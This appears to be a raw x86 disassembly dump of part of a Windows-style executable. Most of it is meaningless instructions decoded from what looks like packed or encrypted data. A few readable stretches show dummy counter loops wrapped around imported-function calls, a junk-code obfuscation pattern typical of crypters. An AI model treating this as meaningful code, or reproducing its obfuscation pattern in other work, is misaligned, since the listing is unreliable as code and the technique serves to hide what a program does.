  406a2e:	addr16 hlt 
  406a30:	push   ecx
  406a31:	push   edi
  406a32:	dec    eax
  406a33:	or     edi,edi
  406a35:	lea    ebp,[edi+0x6e]
  406a38:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406a39:	or     dh,BYTE PTR [ebx+0x20]
  406a3c:	inc    esp
  406a3d:	jecxz  0x4069c5
  406a3f:	ins    DWORD PTR es:[edi],dx
  406a40:	repz or ebp,DWORD PTR [ebp+0x1a]
  406a44:	adc    eax,0x3c8b08d9
  406a49:	in     al,dx
  406a4a:	dec    ebp
  406a4b:	adc    eax,0x224fe0e4
  406a50:	fwait
  406a51:	mov    dl,0x13
  406a53:	ret    0xbc00
  406a56:	sub    BYTE PTR [ecx],dl
  406a58:	mov    esi,0x106dc742
  406a5d:	mov    eax,DWORD PTR [ebp-0x56]
  406a60:	mov    BYTE PTR [ebx],ah
  406a62:	and    DWORD PTR [ecx],ecx
  406a64:	pop    ds
  406a65:	mov    al,ds:0x84265b00
  406a6a:	sar    edx,cl
  406a6c:	ror    esp,0x66
  406a6f:	adc    BYTE PTR [esi],cl
  406a71:	sahf   
  406a72:	out    dx,eax
  406a73:	sti    
  406a74:	adc    DWORD PTR [ebx+0x45897840],ecx
  406a7a:	or     al,0x8b
  406a7c:	inc    ebp
  406a7d:	cld    
  406a7e:	mov    esi,DWORD PTR [ebp-0x8]
  406a81:	xor    eax,edx
  406a83:	xor    esi,edx
  406a85:	add    eax,ecx
  406a87:	add    esi,ecx
  406a89:	imul   eax,esi
  406a8c:	jmp    0x406c05
  406a91:	xorps  xmm5,XMMWORD PTR [edi]
  406a94:	lds    esp,FWORD PTR [edi+0x5d]
  406a97:	in     eax,0x6d
  406a99:	bound  esi,QWORD PTR [esi]
  406a9b:	rcr    DWORD PTR [ebx+0x1c],0x4e
  406a9f:	out    dx,al
  406aa0:	xchg   esi,eax
  406aa1:	add    ebp,DWORD PTR ds:0x7fd87c7c
  406aa7:	jl     0x406b25
  406aa9:	test   eax,0x62b7beb9
  406aae:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406aaf:	jecxz  0x406a80
  406ab1:	loop   0x406af6
  406ab3:	mov    bh,0x3e
  406ab5:	lods   eax,DWORD PTR ds:[esi]
  406ab6:	in     al,0x3c
  406ab8:	and    DWORD PTR [ecx+0x52],ebx
  406abb:	lods   eax,DWORD PTR ds:[esi]
  406abc:	ficomp WORD PTR [eax]
  406abe:	mov    eax,0x7f81ef8c
  406ac3:	adc    al,0xa5
  406ac5:	or     al,0xea
  406ac7:	xlat   BYTE PTR ds:[ebx]
  406ac8:	cmovne edi,DWORD PTR [ecx-0x63565a3c]
  406acf:	cs adc al,0x6e
  406ad2:	jbe    0x406ad7
  406ad4:	mov    bh,0x55
  406ad6:	push   es
  406ad7:	mov    cl,0x53
  406ad9:	daa    
  406ada:	imul   ebp,ebp,0x949068dc
  406ae0:	fidivr WORD PTR [ebp+0x12]
  406ae3:	sahf   
  406ae4:	gs mov eax,0xfab8e362
  406aea:	or     DWORD PTR [ebx],0xffffffd1
  406aed:	and    al,0x72
  406aef:	sbb    BYTE PTR [ecx],dl
  406af1:	push   eax
  406af2:	leave  
  406af3:	pop    eax
  406af4:	mov    bl,ch
  406af6:	ret    
  406af7:	jno    0x406b3e
  406af9:	mov    DWORD PTR [ebx],esp
  406afb:	fwait
  406afc:	pusha  
  406afd:	ja     0x406b0c
  406aff:	pop    ebp
  406b00:	cs cli 
  406b02:	jl     0x406aed
  406b04:	mov    edx,0xc54e7dfc
  406b09:	cmp    ah,BYTE PTR [edi-0x1ee510d8]
  406b0f:	popa   
  406b10:	mov    eax,ds:0xb544a249
  406b15:	gs jecxz 0x406b97
  406b18:	xor    al,0x6a
  406b1a:	and    eax,0xb1be82be
  406b1f:	sti    
  406b20:	or     al,0x96
  406b22:	pop    ecx
  406b23:	pop    ss
  406b24:	jge    0x406b3b
  406b26:	xchg   esp,eax
  406b27:	in     al,dx
  406b28:	jmp    0x357b:0xe4cdcba9
  406b2f:	ins    DWORD PTR es:[edi],dx
  406b30:	xchg   edx,eax
  406b31:	mov    ds:0xad42dd9e,al
  406b36:	xchg   edx,eax
  406b37:	jle    0x406b0e
  406b39:	and    DWORD PTR [ecx-0x15],esi
  406b3c:	les    edi,FWORD PTR [edx+eiz*1+0x84a0df3]
  406b43:	cmp    BYTE PTR [eax],0x57
  406b46:	xchg   ebx,eax
  406b47:	arpl   WORD PTR [edx+ebx*8],bp
  406b4a:	adc    eax,0x792533b6
  406b4f:	nop
  406b50:	mov    esp,0xedc7c4f2
  406b55:	rcr    BYTE PTR [esi],1
  406b57:	clc    
  406b58:	jmp    0x192d:0x6dadb5f9
  406b5f:	aad    0x32
  406b61:	(bad)  
  406b62:	mov    esp,0x6bbed4ed
  406b67:	cld    
  406b68:	stos   BYTE PTR es:[edi],al
  406b69:	div    DWORD PTR [edi+0x3d]
  406b6c:	jbe    0x406b7f
  406b6e:	inc    ebp
  406b6f:	sti    
  406b70:	jno    0x406b97
  406b72:	mov    ds:0x63e73828,eax
  406b77:	fwait
  406b78:	arpl   WORD PTR [ecx],bp
  406b7a:	cmp    cl,BYTE PTR [esi]
  406b7c:	(bad)  
  406b7d:	mov    ds:0x666a3d44,eax
  406b82:	push   eax
  406b83:	sbb    dh,BYTE PTR [ebx+0x632c28b4]
  406b89:	mov    eax,ds:0x175e960b
  406b8e:	inc    ebx
  406b8f:	cmp    al,0x68
  406b91:	push   ecx
  406b92:	inc    esp
  406b93:	dec    ecx
  406b94:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406b95:	mov    DWORD PTR [edi-0x7],0x18ddf9e1
  406b9c:	mov    esi,0xe34f3dae
  406ba1:	sub    bl,BYTE PTR [edi+0x3e]
  406ba4:	lds    eax,FWORD PTR [esp+ecx*2+0x72c5dd30]
  406bab:	push   esi
  406bac:	bnd jne 0x406bb5
  406baf:	sbb    DWORD PTR [ebx-0x70],0xafef0b31
  406bb6:	ret    0xa349
  406bb9:	out    0x75,eax
  406bbb:	mov    ds:0x1c183ebd,al
  406bc0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406bc1:	stos   DWORD PTR es:[edi],eax
  406bc2:	xor    BYTE PTR ds:0xefbf2884,0xa7
  406bc9:	pop    esp
  406bca:	les    ecx,FWORD PTR [esi+esi*8]
  406bcd:	out    dx,eax
  406bce:	mov    cl,0x22
  406bd0:	sbb    bl,BYTE PTR [edi+0x49e9f59d]
  406bd6:	mov    ds:0x4c5d76e4,eax
  406bdb:	cmp    dl,BYTE PTR [ebx]
  406bdd:	(bad)  
  406bde:	imul   ebp,DWORD PTR [ecx+0x1d52c7ee],0x4
  406be5:	inc    ebx
  406be6:	(bad)  
  406be7:	xchg   ebx,eax
  406be8:	call   0x9b4505ec
  406bed:	fwait
  406bee:	lods   al,BYTE PTR cs:[esi]
  406bf0:	sub    eax,0xdbfba559
  406bf5:	jne    0x406c42
  406bf7:	popf   
  406bf8:	mov    edi,0xe29fefb4
  406bfd:	(bad)  
  406bff:	gs push edi
  406c01:	pushf  
  406c02:	add    eax,0x758ba356
  406c07:	or     al,0x3b
  406c09:	lock mov eax,DWORD PTR [ebp-0x4]
  406c0d:	je     0x40675d
  406c13:	xor    eax,edx
  406c15:	add    eax,ecx
  406c17:	mov    ecx,DWORD PTR [ebp+0xc]
  406c1a:	jmp    0x406d93
  406c1f:	stos   BYTE PTR es:[edi],al
  406c20:	adc    DWORD PTR [esp+ebp*2],ebp
  406c23:	mov    ebx,0xc2fd6a61
  406c28:	mov    al,ds:0x543d58d
  406c2d:	pop    ebx
  406c2e:	xchg   edi,eax
  406c2f:	out    dx,eax
  406c30:	sub    al,0x7c
  406c32:	jl     0x406c0c
  406c34:	jg     0x406cb2
  406c36:	jl     0x406c35
  406c38:	daa    
  406c39:	and    al,0x66
  406c3b:	inc    ebx
  406c3c:	push   ds
  406c3d:	js     0x406c96
  406c3f:	sbb    al,0x29
  406c41:	fsub   st(0),st
  406c43:	sar    BYTE PTR [ebx-0x5f0f83d9],1
  406c49:	(bad)  
  406c4a:	(bad)  
  406c4b:	cmp    eax,0xc59970e1
  406c50:	xchg   esi,eax
  406c51:	ins    DWORD PTR es:[edi],dx
  406c52:	mov    eax,0xcb3c09de
  406c57:	scas   eax,DWORD PTR es:[edi]
  406c58:	vmwrite ecx,edi
  406c5b:	enter  0xa6e0,0x5b
  406c5f:	mov    ecx,0xc0d583bc
  406c64:	mov    bl,0x9b
  406c66:	inc    ebp
  406c67:	ror    esi,cl
  406c69:	lds    ebx,FWORD PTR [eax]
  406c6b:	dec    eax
  406c6c:	adc    al,0x1b
  406c6e:	adc    BYTE PTR [ecx+eiz*4+0x7d],dl
  406c72:	mov    cl,0x5a
  406c74:	(bad)  
  406c75:	push   eax
  406c76:	popa   
  406c77:	jne    0x406cce
  406c79:	inc    ecx
  406c7a:	push   ss
  406c7b:	fist   DWORD PTR [edx]
  406c7d:	imul   edi,DWORD PTR [ebp+edi*2-0x7326abf4],0x85da8b84
  406c88:	lods   eax,DWORD PTR ds:[esi]
  406c89:	dec    edx
  406c8a:	jmp    0x406ccb
  406c8c:	mov    eax,0x1f46d988
  406c91:	mov    ebp,0x255da5a
  406c96:	mov    al,ds:0x5270c61b
  406c9b:	ds test esi,esi
  406c9e:	mov    eax,?
  406ca0:	in     al,0xd4
  406ca2:	xchg   esi,eax
  406ca3:	clc    
  406ca4:	aad    0x27
  406ca6:	cs jge 0x406c4e
  406ca9:	and    al,0x8e
  406cab:	and    edi,esi
  406cad:	xchg   esp,eax
  406cae:	scas   eax,DWORD PTR es:[edi]
  406caf:	cmc    
  406cb0:	out    0x6a,al
  406cb2:	add    esi,DWORD PTR [edx-0x66]
  406cb5:	clc    
  406cb6:	and    ebx,DWORD PTR [edx-0x7a4a0304]
  406cbc:	sti    
  406cbd:	aam    0xc0
  406cbf:	js     0x406cb3
  406cc1:	out    0x26,al
  406cc3:	push   ds
  406cc4:	push   eax
  406cc5:	inc    edi
  406cc6:	cmp    cl,bl
  406cc8:	bound  esi,QWORD PTR [ebx+0x824e880]
  406cce:	rol    esp,1
  406cd0:	mov    ?,WORD PTR [eax+0x52]
  406cd3:	aaa    
  406cd4:	mov    esi,0x1cc4795c
  406cd9:	or     edi,DWORD PTR [ecx*4+0x1f14aa08]
  406ce0:	leave  
  406ce1:	mov    eax,ds:0x354672d6
  406ce6:	inc    esp
  406ce7:	push   eax
  406ce8:	xchg   esi,eax
  406ce9:	je     0x406cc6
  406ceb:	addr16 mov ds:0x2c8d,eax
  406cef:	jmp    0x4146:0x3829408
  406cf6:	cld    
  406cf7:	fdiv   st,st(5)
  406cf9:	call   0x1550f0bf
  406cfe:	jle    0x406d67
  406d00:	mov    ch,0x54
  406d02:	mov    esi,0xc25e41d7
  406d07:	cmp    esi,esi
  406d09:	sbb    ecx,DWORD PTR [bx+si]
  406d0c:	dec    edi
  406d0d:	loope  0x406d6b
  406d0f:	sbb    eax,0x6a46025a
  406d14:	cwde   
  406d15:	stos   DWORD PTR es:[edi],eax
  406d16:	mov    eax,ds:0x56b50378
  406d1b:	sbb    BYTE PTR [ebx-0x61],bl
  406d1e:	imul   esi,edi,0x30
  406d21:	fsubr  st,st(3)
  406d23:	lods   eax,DWORD PTR ds:[esi]
  406d24:	mov    dl,0x58
  406d26:	xchg   edi,eax
  406d27:	inc    ebx
  406d28:	cmp    DWORD PTR [esp+eax*2+0xd],eax
  406d2c:	pusha  
  406d2d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406d2e:	adc    DWORD PTR [ebx-0x74563d00],ebp
  406d34:	mov    al,ds:0xf64e74d0
  406d39:	sub    DWORD PTR [edi],esp
  406d3b:	add    BYTE PTR [eax+0x1],0xc8
  406d3f:	adc    edx,edi
  406d41:	aaa    
  406d42:	aam    0x8e
  406d44:	xchg   ebx,eax
  406d45:	leave  
  406d46:	mov    bh,0x1e
  406d48:	push   esp
  406d49:	loopne 0x406cdf
  406d4b:	push   ss
  406d4c:	cs repnz xor eax,0xc74f0611
  406d53:	mov    al,0x45
  406d55:	push   ss
  406d56:	(bad)  
  406d57:	dec    ecx
  406d58:	stos   DWORD PTR es:[edi],eax
  406d59:	mov    esp,0x49e129c1
  406d5e:	test   al,0xcf
  406d60:	jb     0x406d77
  406d62:	sub    al,0xea
  406d64:	loopne 0x406ddd
  406d66:	or     eax,0x51379fbe
  406d6b:	and    al,BYTE PTR [eax-0xa77d55c]
  406d71:	mov    BYTE PTR [edx+0x102e8552],0xfc
  406d78:	repz aaa 
  406d7a:	ss jg  0x406d2d
  406d7d:	and    cl,BYTE PTR [edi-0x18]
  406d80:	xor    al,0x6d
  406d82:	push   cs
  406d83:	or     ebx,DWORD PTR [edx+0x79b98296]
  406d89:	aam    0x3b
  406d8b:	jne    0x406d6c
  406d8d:	push   0x46
  406d8f:	repz dec ebx
  406d91:	das    
  406d92:	mov    eax,0xe9c1af0f
  406d97:	je     0x406d9a
  406d99:	add    BYTE PTR [eax],al
  406d9b:	adc    ch,BYTE PTR [eax]
  406d9d:	mov    bl,0x55
  406d9f:	dec    ebp
  406da0:	ins    DWORD PTR es:[edi],dx
  406da1:	adc    ch,BYTE PTR [ebx-0x44]
  406da4:	sahf   
  406da5:	stos   BYTE PTR es:[edi],al
  406da6:	jmp    0x562dd364
  406dab:	dec    ebx
  406dac:	das    
  406dad:	jl     0x406e2b
  406daf:	fdivr  DWORD PTR [edi+0x7c]
  406db2:	jl     0x406d53
  406db4:	rcr    ebx,1
  406db6:	or     bl,BYTE PTR [edx+0x3b]
  406db9:	jmp    0x406e34
  406dbb:	out    dx,al
  406dbc:	jns    0x406d67
  406dbe:	jbe    0x406d88
  406dc0:	inc    ecx
  406dc1:	pop    edi
  406dc2:	dec    esi
  406dc3:	jmp    0x406e00
  406dc5:	dec    edx
  406dc6:	pusha  
  406dc7:	push   esp
  406dc8:	sbb    cl,BYTE PTR [esi]
  406dca:	das    
  406dcb:	xor    al,0xf
  406dcd:	adc    al,0xda
  406dcf:	adc    BYTE PTR [esi-0x20d6f428],cl
  406dd5:	sbb    eax,0xa3976799
  406dda:	callw  0x56a7
  406dde:	int3   
  406ddf:	mov    ah,BYTE PTR [eax-0xc56cb0f]
  406de5:	fnsave [ecx-0x21]
  406de8:	or     eax,0x7bf7c006
  406ded:	fcom   DWORD PTR [esp+ebx*4]
  406df0:	cmp    dh,BYTE PTR [esi]
  406df2:	inc    DWORD PTR [ecx+0x7f]
  406df5:	stos   BYTE PTR es:[edi],al
  406df6:	jnp    0x406e5f
  406df8:	mov    ds:0xd012fa6b,al
  406dfd:	mov    cl,0x51
  406dff:	(bad)  
  406e00:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406e01:	push   ds
  406e02:	jno    0x406dd8
  406e04:	int    0xe8
  406e06:	and    BYTE PTR [eax],bh
  406e08:	in     al,dx
  406e09:	(bad)  
  406e0a:	sbb    ecx,DWORD PTR [edx+0x13]
  406e0d:	sub    BYTE PTR [esi+0x7c43d6df],ch
  406e13:	jmp    0x46c40bc1
  406e18:	pop    ss
  406e19:	retf   
  406e1a:	pop    edx
  406e1b:	aad    0xa1
  406e1d:	ror    dl,1
  406e1f:	aas    
  406e20:	mov    esp,0x2a34b329
  406e25:	sbb    DWORD PTR [ecx],ebp
  406e27:	mov    esp,esi
  406e29:	(bad)  
  406e2a:	pop    edi
  406e2b:	push   ebp
  406e2c:	stc    
  406e2d:	push   ds
  406e2e:	sub    esp,DWORD PTR [ecx+0x2d]
  406e31:	xor    dl,cl
  406e33:	cmp    DWORD PTR [ebx+0x55ceb1c2],esi
  406e39:	adc    eax,0xacd80d7d
  406e3e:	fucomi st,st(2)
  406e40:	cmp    BYTE PTR ds:0xae8086ee,ch
  406e46:	(bad)  
  406e47:	test   dh,bl
  406e49:	sbb    al,0x40
  406e4b:	jno    0x406ec4
  406e4d:	xchg   esi,eax
  406e4e:	xor    ebp,DWORD PTR [edx+0x50203b6b]
  406e54:	es mov bh,0x1e
  406e57:	std    
  406e58:	ficomp DWORD PTR [ebp-0x69]
  406e5b:	ror    BYTE PTR [edi],cl
  406e5d:	xchg   DWORD PTR [edi],ebp
  406e5f:	cmp    al,0x11
  406e61:	ins    DWORD PTR es:[edi],dx
  406e62:	add    esi,DWORD PTR [edx+0x30]
  406e65:	jbe    0x406ecd
  406e67:	or     eax,0x3a17cb0d
  406e6c:	pop    eax
  406e6d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406e6e:	(bad)  
  406e6f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406e70:	jge    0x406e6a
  406e72:	out    dx,eax
  406e73:	pop    es
  406e74:	icebp  
  406e75:	fcom   DWORD PTR [ebp-0x5f]
  406e78:	int3   
  406e79:	push   0x43726491
  406e7e:	or     BYTE PTR [edx+edx*2-0x5a1f0001],cl
  406e85:	xor    eax,DWORD PTR [esi+0x4d]
  406e88:	(bad)  
  406e89:	call   0x36ea692b
  406e8e:	fst    QWORD PTR [esi]
  406e90:	inc    ebp
  406e91:	ins    DWORD PTR es:[edi],dx
  406e92:	fisub  DWORD PTR [ebp+0x7a]
  406e95:	rcr    dh,1
  406e97:	push   eax
  406e98:	les    ebx,FWORD PTR [esi-0x21]
  406e9b:	mov    bh,0x69
  406e9d:	cli    
  406e9e:	sub    eax,0xdd81007e
  406ea3:	cmp    BYTE PTR [ebp+ebx*4-0x73a4c9ba],bl
  406eaa:	rcl    BYTE PTR [edx],cl
  406eac:	and    DWORD PTR [esi-0x2614a31d],ebp
  406eb2:	shl    BYTE PTR [ebx],cl
  406eb4:	add    al,0x2a
  406eb6:	push   edx
  406eb7:	sub    BYTE PTR [edx-0x1096a038],al
  406ebd:	push   eax
  406ebe:	sbb    eax,0x74f39aa9
  406ec3:	mov    ds:0xaa60dccf,eax
  406ec8:	nop
  406ec9:	xchg   eax,eax
  406ecb:	mov    ebp,0x5be6a05c
  406ed0:	push   es
  406ed1:	dec    ebp
  406ed2:	idiv   DWORD PTR [edx+0x65fa9c98]
  406ed8:	jle    0x406e67
  406eda:	push   es
  406edb:	outs   dx,DWORD PTR ds:[esi]
  406edc:	sub    al,0xe8
  406ede:	fwait
  406edf:	lods   al,BYTE PTR ds:[esi]
  406ee0:	dec    ebx
  406ee1:	cwde   
  406ee2:	add    ch,dh
  406ee4:	sar    DWORD PTR [esi+ecx*1-0x67],1
  406ee8:	rcr    DWORD PTR [ecx+0x5f715044],cl
  406eee:	mov    eax,0xcd4fb76b
  406ef3:	dec    ebx
  406ef4:	std    
  406ef5:	arpl   WORD PTR [ecx-0x1a],dx
  406ef8:	out    0x10,eax
  406efa:	xchg   edi,eax
  406efb:	cli    
  406efc:	imul   eax,DWORD PTR [edx],0x77
  406eff:	fst    QWORD PTR [ebx+0x5345a778]
  406f05:	add    DWORD PTR [ebp+0x5c],eax
  406f08:	iretw  
  406f0a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406f0b:	sahf   
  406f0c:	stc    
  406f0d:	pop    ds
  406f0e:	inc    esi
  406f0f:	add    eax,DWORD PTR [ebp+0x8]
  406f12:	mov    DWORD PTR [ebp+0xc],eax
  406f15:	mov    eax,DWORD PTR [ebp+0xc]
  406f18:	pop    esi
  406f19:	leave  
  406f1a:	ret    0x8
  406f1d:	push   ebp
  406f1e:	mov    ebp,esp
  406f20:	sub    esp,0x30
  406f23:	xor    eax,0x5695
  406f28:	mov    DWORD PTR [ebp-0x4],0xf89c8535
  406f2f:	mov    DWORD PTR ds:0x4292ad,0x11
  406f39:	cmp    DWORD PTR ds:0x4292ad,0x0
  406f40:	je     0x406f7d
  406f46:	cmp    DWORD PTR ds:0x4292ad,0x1b
  406f4d:	jne    0x406f61
  406f53:	push   0x7d57
  406f58:	push   DWORD PTR [ebp-0xc]
  406f5b:	call   DWORD PTR ds:0x427ac7
  406f61:	mov    ecx,DWORD PTR ds:0x4292ad
  406f67:	dec    ecx
  406f68:	mov    DWORD PTR ds:0x4292ad,ecx
  406f6e:	jmp    0x406f39
  406f73:	xor    DWORD PTR ds:0x427594,0x427d17
  406f7d:	mov    DWORD PTR [ebp-0x18],0xf89c8534
  406f84:	mov    ecx,DWORD PTR [ebp-0x4]
  406f87:	push   ebx
  406f88:	mov    eax,0x7510857
  406f8d:	adc    ebx,DWORD PTR ds:0x4292c5
  406f93:	xor    ecx,eax
  406f95:	and    DWORD PTR ds:0x4292c5,0x0
  406f9f:	jmp    0x406fb1
  406fa4:	mov    ebx,DWORD PTR ds:0x4292c5
  406faa:	inc    ebx
  406fab:	mov    DWORD PTR ds:0x4292c5,ebx
  406fb1:	cmp    DWORD PTR ds:0x4292c5,0x12
  406fb8:	jae    0x407003
  406fbe:	cmp    DWORD PTR ds:0x4292c5,0x4
  406fc5:	jne    0x406fe4
  406fcb:	push   DWORD PTR [ebp-0x18]
  406fce:	push   DWORD PTR [ebp-0x18]
  406fd1:	push   0x4bf1
  406fd6:	push   DWORD PTR [ebp-0x28]
  406fd9:	push   0x78bb
  406fde:	call   DWORD PTR ds:0x427acb
  406fe4:	cmp    DWORD PTR ds:0x4292c5,0x3
  406feb:	jne    0x406ffe
  406ff1:	mov    ebx,DWORD PTR ds:0x4292c5
  406ff7:	inc    ebx
  406ff8:	mov    DWORD PTR ds:0x4292c5,ebx
  406ffe:	jmp    0x406fa4
  407003:	mov    ebx,0x32729e
  407008:	add    DWORD PTR ds:0x427cfb,0x42c892
  407012:	add    ecx,ebx
  407014:	mov    DWORD PTR [ebp-0x1c],ecx
  407017:	neg    DWORD PTR ds:0x427d0f
  40701d:	mov    ecx,DWORD PTR [ebp+0x14]
  407020:	sub    DWORD PTR ds:0x427cf7,0x56dd
  40702a:	push   esi
  40702b:	push   edi
  40702c:	add    DWORD PTR ds:0x427d0f,0x42c89a
  407036:	test   ecx,ecx
  407038:	mov    DWORD PTR ds:0x4292c5,0x64aa
  407042:	je     0x407316
  407048:	and    DWORD PTR ds:0x42c882,0x0
  407052:	mov    esi,DWORD PTR ds:0x42c882
  407058:	inc    esi
  407059:	mov    DWORD PTR ds:0x42c882,esi
  40705f:	cmp    DWORD PTR ds:0x42c882,0x6
  407066:	jne    0x40707e
  40706c:	push   DWORD PTR [ebp-0x24]
  40706f:	push   DWORD PTR [ebp-0x18]
  407072:	push   DWORD PTR [ebp-0x14]
  407075:	push   DWORD PTR [ebp-0x28]
  407078:	call   DWORD PTR ds:0x427c6f
  40707e:	cmp    DWORD PTR ds:0x42c882,0x5
  407085:	jne    0x40709a
  40708b:	xor    esi,esi
  40708d:	or     esi,DWORD PTR ds:0x42c882
  407093:	inc    esi
  407094:	mov    DWORD PTR ds:0x42c882,esi
  40709a:	cmp    DWORD PTR ds:0x42c882,0x14
  4070a1:	jb     0x407052
  4070a7:	mov    ecx,DWORD PTR [ebp+0x14]
  4070aa:	mov    DWORD PTR ds:0x4292b1,0x1a
  4070b4:	cmp    DWORD PTR ds:0x4292b1,0x0
  4070bb:	je     0x407188
  4070c1:	cmp    DWORD PTR ds:0x4292b1,0xc
  4070c8:	jne    0x4070de
  4070ce:	push   0x42783c
  4070d3:	push   0x4275b4
  4070d8:	call   DWORD PTR ds:0x4279f3
  4070de:	cmp    DWORD PTR ds:0x4292b1,0xd
  4070e5:	jne    0x4070fa
  4070eb:	xor    edi,edi
  4070ed:	xor    edi,DWORD PTR ds:0x4292b1
  4070f3:	dec    edi
  4070f4:	mov    DWORD PTR ds:0x4292b1,edi
  4070fa:	xor    edi,edi
  4070fc:	or     edi,DWORD PTR ds:0x4292b1
  407102:	dec    edi
  407103:	mov    DWORD PTR ds:0x4292b1,edi
  407109:	jmp    0x4070b4
  40710e:	and    DWORD PTR ds:0x4292b5,0x0
  407118:	jmp    0x40712a
  40711d:	mov    edi,DWORD PTR ds:0x4292b5
  407123:	inc    edi
  407124:	mov    DWORD PTR ds:0x4292b5,edi
  40712a:	cmp    DWORD PTR ds:0x4292b5,0x16
  407131:	jae    0x407188
  407137:	cmp    DWORD PTR ds:0x4292b5,0x4
  40713e:	jne    0x407169
  407144:	push   DWORD PTR [ebp-0x28]
  407147:	push   0x1a81
  40714c:	push   0x427d07
  407151:	push   0x8e69
  407156:	push   0x489c
  40715b:	push   0x5b7d
  407160:	push   DWORD PTR [ebp-0x10]
  407163:	call   DWORD PTR ds:0x427c73
  407169:	cmp    DWORD PTR ds:0x4292b5,0x3
  407170:	jne    0x407183
  407176:	mov    edi,DWORD PTR ds:0x4292b5
  40717c:	inc    edi
  40717d:	mov    DWORD PTR ds:0x4292b5,edi
  407183:	jmp    0x40711d
  407188:	mov    ecx,DWORD PTR [ecx]
  40718a:	jmp    0x407313
  40718f:	jne    0x40718d
  407191:	mov    cl,0x3f
  407193:	mov    ch,0x31
  407195:	cmc    
  407196:	mov    dl,0xc1
  407198:	pop    edx
  407199:	sub    DWORD PTR [esi+0x1a473864],esp
  40719f:	pop    ss
  4071a0:	and    DWORD PTR [esp+edi*2-0x18],edi
  4071a4:	jg     0x407222
  4071a6:	jl     0x40719f
  4071a8:	in     eax,0xe3
  4071aa:	call   0xc7e4:0xec78af2c
  4071b1:	inc    ebx
  4071b2:	mov    WORD PTR ds:0xa67e015d,ss
  4071b8:	cs xchg bl,bh
  4071bb:	xor    eax,0x11569f69
  4071c0:	adc    bl,BYTE PTR [ecx]
  4071c2:	cli    
  4071c3:	stos   BYTE PTR es:[edi],al
  4071c4:	jne    0x40721c
  4071c6:	arpl   WORD PTR [ebx+0x4c3289da],di
  4071cc:	sub    BYTE PTR [ecx+0x7c],dl
  4071cf:	cld    
  4071d0:	loop   0x40721d
  4071d2:	push   edi
  4071d3:	adc    eax,0xdd33ca0
  4071d8:	ret    0xa2c0
  4071db:	into   
  4071dc:	call   0x21acf866
  4071e1:	ins    BYTE PTR es:[edi],dx
  4071e2:	and    al,0x4f
  4071e4:	mov    eax,ds:0x728f6333
  4071e9:	cdq    
  4071ea:	xor    al,0x89
  4071ec:	mov    ebx,0x57b225b2
  4071f1:	dec    edx
  4071f2:	fbld   TBYTE PTR [eax-0x92342f1]
  4071f8:	dec    edx
  4071f9:	jl     0x407201
  4071fb:	sub    al,0x6
  4071fd:	xchg   esp,eax
  4071fe:	add    dh,BYTE PTR [ebx+0x45a036fc]
  407204:	(bad)  
  407205:	int    0xd0
  407207:	loop   0x4071d1
  407209:	sub    DWORD PTR [ecx],edi
  40720b:	shl    DWORD PTR [edx+0x31],1
  40720e:	jp     0x40723b
  407210:	out    0x34,eax
  407212:	jmp    0x407232
  407214:	adc    BYTE PTR [edx-0x52f46463],dl
  40721a:	sbb    BYTE PTR [esi],ch
  40721c:	dec    ebx
  40721d:	pop    ss
  40721e:	fnstcw WORD PTR [ebx]
  407220:	mov    ebp,0xce5dd257
  407225:	push   ebx
  407226:	xlat   BYTE PTR ds:[ebx]
  407227:	js     0x4071c7
  407229:	mov    eax,ds:0x42d46e98
  40722e:	and    ebp,DWORD PTR [ebx-0x3ec29354]
  407234:	mov    ebp,DWORD PTR [ebp+0x4115af64]
  40723a:	loopne 0x40726f
  40723c:	xor    ecx,esp
  40723e:	sbb    DWORD PTR [ecx],ebp
  407240:	in     al,dx
  407241:	sar    BYTE PTR [ebx],cl
  407243:	mov    DWORD PTR [eax],edx
  407245:	adc    al,BYTE PTR [esi]
  407247:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407248:	or     cl,BYTE PTR [edx+0x15]
  40724b:	adc    edi,ebp
  40724d:	push   cs
  40724e:	push   ebx
  40724f:	or     bl,BYTE PTR ds:0x637ad93d
  407255:	stos   DWORD PTR es:[edi],eax
  407256:	or     eax,0x14684772
  40725b:	cs cdq 
  40725d:	pop    ebp
  40725e:	fs in  eax,dx
  407260:	cmp    eax,0x1f64b0c2
  407265:	sbb    BYTE PTR [eax-0x6d1a9d7],ah
  40726b:	pop    ecx
  40726c:	xor    eax,0xd664d8a1
  407271:	dec    ecx
  407272:	xchg   esi,eax
  407273:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407274:	pop    eax
  407275:	adc    BYTE PTR [bp+di+0x69],bh
  407279:	cmp    DWORD PTR [ebx],edi
  40727b:	fwait
  40727c:	clc    
  40727d:	(bad)
  407281:	dec    edi
  407282:	cmp    bh,cl
  407284:	outs   dx,BYTE PTR ds:[esi]
  407285:	test   ch,ah
  407287:	dec    ebp
  407288:	sar    DWORD PTR es:[edx+0x786d4bf1],0x1f
  407290:	repz out dx,eax
  407292:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407294:	mov    eax,ds:0x96fdbae1
  407299:	shl    DWORD PTR [ebx+0x1aca4d99],0xc3
  4072a0:	mov    eax,ss
  4072a2:	add    esi,ecx
  4072a4:	xor    al,0xad
  4072a6:	repnz cmp al,0xec
  4072a9:	mov    bl,0x35
  4072ab:	mov    ebp,0x640eb062
  4072b0:	mov    eax,0x2e6594a4
  4072b5:	gs pushf 
  4072b7:	push   esp
  4072b8:	retf   0x1013
  4072bb:	pop    edx
  4072bc:	add    al,0x66
  4072be:	test   eax,0x304952be
  4072c3:	cmp    BYTE PTR [esi-0x49ccf042],0x8d
  4072ca:	retf   0x839
  4072cd:	xor    al,0x35
  4072cf:	call   0x38e9:0x2ea6a2e3
  4072d6:	mov    al,0x40
  4072d8:	cmp    DWORD PTR [esi],eax
  4072da:	dec    edi
  4072db:	mov    bh,0x4f
  4072dd:	mov    ecx,0xb1f0dcca
  4072e2:	loope  0x407304
  4072e4:	xchg   esi,eax
  4072e5:	sbb    ebx,esi
  4072e7:	push   ebx
  4072e8:	xchg   ebx,eax
